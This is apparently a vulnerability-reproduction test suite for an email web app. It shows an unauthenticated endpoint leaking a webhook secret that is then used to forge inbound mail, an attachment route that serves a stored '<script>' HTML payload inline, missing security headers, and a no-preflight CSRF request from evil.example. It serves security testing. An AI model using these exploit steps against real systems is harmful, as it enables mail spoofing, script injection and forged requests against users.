/**
 * Webhook secret exposure, CSRF-ability, and missing security headers.
 *
 * - GET /api/connectors/inbound returns cf_email_webhook_secret in cleartext
 *   (connectors.ts:66). With C1 (no auth) any origin can read it, then forge
 *   inbound mail through the webhook.
 * - API routes carry no CSP / X-Frame-Options / X-Content-Type-Options.
 * - The /api/attachments/by-cid response serves a sender-controlled
 *   Content-Type with NO Content-Disposition and NO nosniff; the CSP that DOES
 *   get attached is script-src 'self', which still permits a sibling
 *   same-origin attachment to be loaded as <script> (the H1 bypass).
 * - No Content-Type guard -> simple-request CSRF (no preflight) works.
 */
import { describe, expect, it } from "vitest";
import { createApp } from "../../src/api/server.js";
import { upsertAttachmentBlob } from "../../src/storage/attachment-storage.js";
import {
	createTestContext,
	createTestDb,
	createTestFolder,
	createTestInboundConnector,
	createTestMessage,
} from "../../src/test-helpers/test-db.js";
import { TcpCapture } from "./helpers.js";

function seedHtmlAttachment(db: ReturnType<typeof createTestDb>) {
	const conn = createTestInboundConnector(db);
	const folder = createTestFolder(db, conn, "INBOX", { name: "INBOX" });
	const msgId = createTestMessage(db, conn, folder, 1, { subject: "cid test" });
	const hash = upsertAttachmentBlob(db, Buffer.from("<script>alert(1)</script>", "utf8"));
	db.prepare(
		"INSERT INTO attachments (message_id, filename, content_type, size, content_id, content_hash) VALUES (?,?,?,?,?,?)",
	).run(msgId, "evil.html", "text/html", 25, "evilcid", hash);
	return msgId;
}

describe("Webhook secret exposure + headers + CSRF", () => {
	it("leaks cf_email_webhook_secret via GET /api/connectors/inbound and the secret is usable", async () => {
		const db = createTestDb();
		db.prepare(
			"INSERT INTO inbound_connectors (name, type, cf_email_webhook_secret) VALUES ('cf','cloudflare-email',?)",
		).run("top-secret-webhook-token");
		const { app } = createApp(createTestContext(db));

		const list = await app.request("/api/connectors/inbound", { headers: { Origin: "https://evil.example" } });
		const body = JSON.stringify(await list.json());
		expect(body).toContain("top-secret-webhook-token"); // secret disclosed

		// The leaked secret authenticates a forged inbound email.
		const row = db.prepare("SELECT id FROM inbound_connectors").get() as { id: number };
		const raw = Buffer.from(
			"From: spoof@evil.example\r\nTo: victim@corp.example\r\nSubject: Forged\r\n\r\nhi",
		).toString("base64");
		const hook = await app.request(`/api/webhook/cloudflare-email/${row.id}`, {
			method: "POST",
			headers: { "content-type": "application/json", Authorization: "Bearer top-secret-webhook-token" },
			body: JSON.stringify({ from: "spoof@evil.example", to: "victim@corp.example", raw, rawSize: raw.length }),
		});
		expect(hook.status).toBe(200);
	});

	it("API responses have no CSP / X-Frame-Options / nosniff", async () => {
		const { app } = createApp(createTestContext(createTestDb()));
		const res = await app.request("/api/health");
		expect(res.headers.get("content-security-policy")).toBeNull();
		expect(res.headers.get("x-frame-options")).toBeNull();
		expect(res.headers.get("x-content-type-options")).toBeNull();
	});

	it("by-cid serves sender Content-Type with no Content-Disposition/nosniff; CSP allows same-origin script", async () => {
		const db = createTestDb();
		const msgId = seedHtmlAttachment(db);
		const { app } = createApp(createTestContext(db));
		const res = await app.request(`/api/attachments/by-cid/${msgId}/evilcid`);
		expect(res.status).toBe(200);
		expect(res.headers.get("content-type")).toContain("text/html"); // sender controls this
		expect(res.headers.get("content-disposition")).toBeNull();      // would render inline
		expect(res.headers.get("x-content-type-options")).toBeNull();   // no nosniff
		const csp = res.headers.get("content-security-policy") ?? "";
		expect(csp).toContain("script-src 'self'");     // inline blocked, but...
		expect(csp).not.toContain("frame-ancestors");   // ...and page is framable (clickjacking)
	});

	it("no Content-Type guard -> simple-request CSRF (no preflight) hits /api/send/test-smtp", async () => {
		const trap = new TcpCapture();
		const port = await trap.start();
		try {
			const { app } = createApp(createTestContext(createTestDb()));
			// text/plain is a CORS "simple" content-type: an HTML <form> can send it
			// with no preflight, so wildcard CORS + no CSRF token = drive-by.
			const res = await app.request("/api/send/test-smtp", {
				method: "POST",
				headers: { "content-type": "text/plain", Origin: "https://evil.example" },
				body: JSON.stringify({ smtp_host: "127.0.0.1", smtp_port: port, smtp_tls: 0, smtp_user: "u", smtp_pass: "p" }),
			});
			expect(res.status).toBe(200);
			await new Promise((r) => setTimeout(r, 120));
			expect(trap.hits.length).toBeGreaterThan(0);
		} finally { await trap.stop(); }
	});
});
